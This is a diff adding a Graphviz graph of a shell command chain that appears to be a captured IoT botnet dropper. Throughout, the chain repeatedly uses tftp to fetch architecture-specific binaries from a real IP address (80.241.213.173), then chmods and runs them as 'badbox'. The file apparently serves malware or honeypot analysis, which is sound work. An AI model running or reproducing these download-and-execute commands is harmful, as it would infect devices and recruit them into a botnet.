@@ -1,0 +1,304 @@
+digraph {
+0 [label="ulimit -n 1024 "];
+0 -> 0
+2 [label="cp /bin/busybox /tmp/ "];
+2 -> 2
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 14 [label="||,"];
+14 [label="tftp -r snnmips -g 80.241.213.173 "];
+14 -> 16 [label=";,"];
+16 [label="cat snnmips badbox "];
+16 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 34 [label="||,"];
+34 [label="tftp -r snnmips64 -g 80.241.213.173 "];
+34 -> 36 [label=";,"];
+36 [label="cat snnmips64 badbox "];
+36 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 54 [label="||,"];
+54 [label="tftp -r snnmipsel -g 80.241.213.173 "];
+54 -> 56 [label=";,"];
+56 [label="cat snnmipsel badbox "];
+56 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 74 [label="||,"];
+74 [label="tftp -r snnsh4 -g 80.241.213.173 "];
+74 -> 76 [label=";,"];
+76 [label="cat snnsh4 badbox "];
+76 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 94 [label="||,"];
+94 [label="tftp -r snnx86 -g 80.241.213.173 "];
+94 -> 96 [label=";,"];
+96 [label="cat snnx86 badbox "];
+96 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 114 [label="||,"];
+114 [label="tftp -r snni586 -g 80.241.213.173 "];
+114 -> 116 [label=";,"];
+116 [label="cat snni586 badbox "];
+116 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 134 [label="||,"];
+134 [label="tftp -r snni686 -g 80.241.213.173 "];
+134 -> 136 [label=";,"];
+136 [label="cat snni686 badbox "];
+136 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 154 [label="||,"];
+154 [label="tftp -r snnpowerpc -g 80.241.213.173 "];
+154 -> 156 [label=";,"];
+156 [label="cat snnpowerpc badbox "];
+156 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 174 [label="||,"];
+174 [label="tftp -r snnpowerpc440fp -g 80.241.213.173 "];
+174 -> 176 [label=";,"];
+176 [label="cat snnpowerpc440fp badbox "];
+176 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 194 [label="||,"];
+194 [label="tftp -r snnm86k -g 80.241.213.173 "];
+194 -> 196 [label=";,"];
+196 [label="cat snnm86k badbox "];
+196 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 214 [label="||,"];
+214 [label="tftp -r snnsparc -g 80.241.213.173 "];
+214 -> 216 [label=";,"];
+216 [label="cat snnsparc badbox "];
+216 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 234 [label="||,"];
+234 [label="tftp -r snnarmv4 -g 80.241.213.173 "];
+234 -> 236 [label=";,"];
+236 [label="cat snnarmv4 badbox "];
+236 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 254 [label="||,"];
+254 [label="tftp -r snnarmv4tl -g 80.241.213.173 "];
+254 -> 256 [label=";,"];
+256 [label="cat snnarmv4tl badbox "];
+256 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 274 [label="||,"];
+274 [label="tftp -r snnarmv5 -g 80.241.213.173 "];
+274 -> 276 [label=";,"];
+276 [label="cat snnarmv5 badbox "];
+276 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+301 [label="./badbox "];
+301 -> 284 [label=";,"];
+284 [label="cd /tmp "];
+284 -> 284
+286 [label="cd /var/system "];
+286 -> 288 [label="||,"];
+288 [label="cd /mnt "];
+288 -> 290 [label="||,"];
+290 [label="cd /root "];
+290 -> 292 [label="||,"];
+292 [label="cd / "];
+292 -> 294 [label="||,"];
+294 [label="tftp -r snnarmv6 -g 80.241.213.173 "];
+294 -> 296 [label=";,"];
+296 [label="cat snnarmv6 badbox "];
+296 -> 298 [label=";,"];
+298 [label="badbox "];
+298 -> 298
+300 [label="chmod +x * "];
+300 -> 301 [label=";,"];
+}
